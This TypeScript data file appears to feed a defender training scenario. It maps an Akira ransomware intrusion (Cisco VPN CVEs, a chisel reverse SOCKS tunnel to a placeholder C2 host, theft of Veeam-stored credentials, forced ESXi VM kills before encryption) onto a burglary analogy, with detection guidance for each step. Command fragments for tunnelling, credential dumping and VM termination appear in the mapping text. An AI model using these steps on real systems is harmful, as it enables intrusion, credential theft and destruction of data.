import type { ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a corporate data center whose front lobby keycard reader still honors single-factor staff passwords without a pocket code. A burglar slips through the lobby door, threads a hidden garden hose out through a back vent to bring in extra helpers, raids the backup-vault clerk desk to steal the master building-basement keys, and then marches down to the basement to shut off every virtual apartment simultaneously and padlock their heavy foundation files.',
      storyMappings: [
        {
          storyTerm: 'Front lobby door accepting single-factor passwords',
          technicalTerm: 'Cisco ASA / FTD AnyConnect SSLVPN breach via CVE-2023-20269 or CVE-2020-3259',
          tone: 'amber',
        },
        {
          storyTerm: 'Hidden garden hose threaded out through a back vent',
          technicalTerm: 'chisel.exe reverse SOCKS tunnel bridging attacker tools into the internal LAN',
          tone: 'sky',
        },
        {
          storyTerm: 'Raiding the backup-vault clerk desk for basement keys',
          technicalTerm: 'Dumping [VeeamBackup].[dbo].[Credentials] via sqlcmd.exe and DPAPI decryption',
          tone: 'rose',
        },
        {
          storyTerm: 'Shutting off every virtual apartment and padlocking foundation files',
          technicalTerm: 'SSH esxcli vm process kill followed by Rust-based Akira ESXi VMDK encryption',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Testing the exterior remote-access lobby door from an outside commercial warehouse, the intruder exploits a flaw in the single-password gate and walks cleanly into the internal office corridor without ever passing a second-factor badge check.',
        storyMappings: [
          {
            storyTerm: 'Exterior remote-access lobby door',
            technicalTerm: 'WAN-facing Cisco ASA or Firepower Threat Defense (FTD) AnyConnect VPN',
            tone: 'amber',
          },
          {
            storyTerm: 'Single-password gate flaw',
            technicalTerm: 'CVE-2023-20269 / CVE-2020-3259 or credential stuffing against non-MFA VPN groups',
            tone: 'sky',
          },
          {
            storyTerm: 'Outside commercial warehouse',
            technicalTerm: 'External VPS and commercial hosting ASNs initiating VPN sessions',
            tone: 'rose',
          },
          {
            storyTerm: 'Lobby guard book recording the unusual entry',
            technicalTerm: 'Cisco ASA syslog %ASA-6-722022 and %ASA-6-113004 authentication events',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Monitor Cisco ASA syslog events %ASA-6-722022 and %ASA-6-113004 (which log AnyConnect IP assignment and group authentication) for logins hitting DefaultWEBVPNGroup or DefaultRAGroup from external hosting ASNs without MFA (detecting initial Akira perimeter entry).',
      },
      2: {
        storyAnalogy:
          'Once inside the building, the intruder snakes a concealed reverse speaking tube out to their hideout, then visits the corporate backup-scheduler office to unlock its credential safe and lift the master keys to the basement hypervisor racks.',
        storyMappings: [
          {
            storyTerm: 'Concealed reverse speaking tube out to the hideout',
            technicalTerm: 'chisel.exe client https://<c2>:8443 R:socks reverse SOCKS proxy',
            tone: 'amber',
          },
          {
            storyTerm: 'Corporate backup-scheduler credential safe',
            technicalTerm: 'Veeam Backup SQL table [VeeamBackup].[dbo].[Credentials] queried via sqlcmd.exe',
            tone: 'sky',
          },
          {
            storyTerm: 'Unwrapping the locked backup safe keys',
            technicalTerm: 'DPAPI CryptUnprotectData decryption of stored vCenter and ESXi root passwords',
            tone: 'rose',
          },
          {
            storyTerm: 'Stairwell leading straight to the basement racks',
            technicalTerm: 'Lateral SSH pivot directly onto VMware ESXi hypervisor management interfaces',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Alert on Sysmon EventID 1 (Process Creation recording command lines) for chisel.exe reverse proxy launches or sqlcmd.exe querying [VeeamBackup].[dbo].[Credentials] paired with unexpected DPAPI CryptUnprotectData calls on the Veeam backup server (catching hypervisor credential theft).',
      },
      3: {
        storyAnalogy:
          'Descending into the basement hypervisor hall with stolen master keys, the intruder flips the hard power breakers on every running virtual office so their disk bolts release, then unleashes a fast Rust padlocking machine that encrypts entire virtual servers in minutes.',
        storyMappings: [
          {
            storyTerm: 'Flipping hard power breakers on running virtual offices',
            technicalTerm: 'Shell loop invoking esxcli vm process list and esxcli vm process kill --type=force',
            tone: 'amber',
          },
          {
            storyTerm: 'Releasing heavy disk bolts',
            technicalTerm: 'Releasing exclusive hypervisor locks held on *-flat.vmdk virtual disk files',
            tone: 'sky',
          },
          {
            storyTerm: 'Fast Rust padlocking machine',
            technicalTerm: 'Linux ELF Rust-compiled Akira ESXi encryptor launched from /tmp',
            tone: 'rose',
          },
          {
            storyTerm: 'Basement audit logs recording the shutdowns',
            technicalTerm: 'ESXi /var/log/shell.log and /var/log/hostd.log forwarded off-host to SIEM',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Forward ESXi /var/log/shell.log and /var/log/hostd.log off-host to a central SIEM (preserving hypervisor audit records before local wipe) and alert immediately on esxcli vm process kill bursts paired with unsigned ELF binaries executing from /tmp.',
      },
    },
  };
